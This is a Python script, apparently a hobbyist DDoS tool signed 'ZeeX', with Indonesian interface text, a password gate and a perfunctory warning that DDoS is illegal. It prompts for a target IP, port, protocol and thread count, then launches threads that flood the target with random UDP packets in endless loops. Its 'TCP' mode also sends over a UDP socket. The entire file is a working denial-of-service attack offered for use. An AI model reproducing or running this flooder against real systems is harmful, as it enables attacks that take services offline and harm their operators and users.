import random
import socket
import threading
import os,sys
import time

os.system("clear")
password = "ZeeX"

for i in range(3):
	pwd = input("\033[1;31;40m[•]PASSWORD : ")
	j=3
	if(pwd==password):
		time.sleep(5)
		print("\033[1;32;40m[✓]PASSWORD BENAR ")
		break
	else:
		time.sleep(5)
		print("[×] Password Salah!!! ")
		continue
time.sleep(5)
os.system("clear")
print("\u001b[31m{√} Baca Bentar Bang!")
print("""\u001b[31m
|              WARNING!!!!               |
|                                        |
|DDOS MERUPAN HAL YANG ILEGAL KALAU LU   |
|ABUSE TANGGUNG SENDIRI AKIBAT NYA GUA   |
|GAK NAKUT NAKUTIN GUA CUMA PERINGATIN   |
|OKE JANGAN SAMPAI KALIAN ABUSE YA       |
|AUTHOR : ZEEX                           |""")
print("[•]Tunggu 5 Detik Bang")
time.sleep(5)
os.system("clear")
print("\033[1;32;40m>> TOOLS BY ZEEX <<")
time.sleep(1)
print("\033[1;32;40m>> DONT ABUSE TOOLS <<")
time.sleep(1)
print("\033[1;32;40m>> Join My Community <<")
time.sleep(3)
os.system("clear")
print('''\033[1;31;40m
  _____                                    
 |_   _|__  __ _ _ __ ___                  
   | |/ _ \/ _` | '_ ` _ \ _____           
   | |  __/ (_| | | | | | |_____|          
   |_|\___|\__,_|_| |_| |_|                
  _     _____ ____ _____ _   _ ____  ____  
 | |   | ____/ ___| ____| \ | |  _ \/ ___| 
 | |   |  _|| |  _|  _| |  \| | | | \___ \ 
 | |___| |__| |_| | |___| |\  | |_| |___) |
 |_____|_____\____|_____|_| \_|____/|____/ ''')

ip = str(input("\033[1;29;40mIP TARGET:"))
port = int(input("\033[1;29;40mPORT TARGET:"))
choice = str(input("\033[1;29;40m(UDP/TCP):"))
times = int(input("\033[1;29;40mPACKET:"))
threads = int(input("\033[1;29;40mISI PACKET:"))
os.system("clear")
def run():
    data =random._urandom(1664)
    i = random.choice(("\033[95m[ZX] (MENGIRIM PAKET DAN)","\033[95m[ZX] (MENGIRIM PAKET DAN)","\033[95m[ZX] (MENGIRIM PAKET DAN)"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (str(ip),int(port))
            for x in range(times):
                s.sendto(data,addr)
                s.sendto(data,addr)
                s.sendto(data,addr)
                s.sendto(data,addr)
                s.sendto(data,addr)
                s.sendto(data,addr)
            print(i +"\033[91m MEMBANTAI IP \033[0m%s \033[91mMENINDAS PORT \033[0m%s"%(ip, port))
        except:
            print("[•] Reconnect")

def run2():
    data =random._urandom(1554)
    i = random.choice(("\033[95m[ZX] (MENGIRIM PAKET DAN)","\033[95m[ZX] (MENGIRIM PAKET DAN)","\033[95m[ZX] (MENGIRIM PAKET DAN)"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (str(ip),int(port))
            for x in range(times):
                s.sendto(data,addr)
            print(i +"\033[91m MEMBANTAI IP \033[0m%s \033[91mMENINDAS PORT \033[0m%s"%(ip, port))
        except:
            print("[•] Reconnect")

def run3():
    data =random._urandom(1090)
    i = random.choice(("\033[95m[ZX] (MENGIRIM PAKET DAN)","\033[95m[ZX] (MENGIRIM PAKET DAN)","\033[95m[ZX] (MENGIRIM PAKET DAN)"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (str(ip),int(port))
            for x in range(times):
                s.sendto(data,addr)
            print(i +"\033[91m MEMBANTAI IP \033[0m%s \033[91mMENINDAS PORT \033[0m%s"%(ip, port))
        except:
            print("[•] Reconnect")

def tcp():
    data = random._urandom(1024000)
    i = random.choice(("\033[95m[ZX] (MENGIRIM PAKET DAN)","\033[95m[ZX] (MENGIRIM PAKET DAN)","\033[95m[ZX] (MENGIRIM PAKET DAN)"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"\033[91m MEMBANTAI IP \033[0m%s \033[91mMENINDAS PORT \033[0m%s"%(ip, port))
        except:
            s.close()
            print("[•] Reconnect")

for y in range(threads):
    if choice == 'UDP':
        th = threading.Thread(target = run)
        th.start()
    elif choice == 'TCP':
        th = threading.Thread(target = tcp)
        th.start()
    else:
        th = threading.Thread(target = run2)
        th.start()
        th = threading.Thread(target = run3)
        th.start()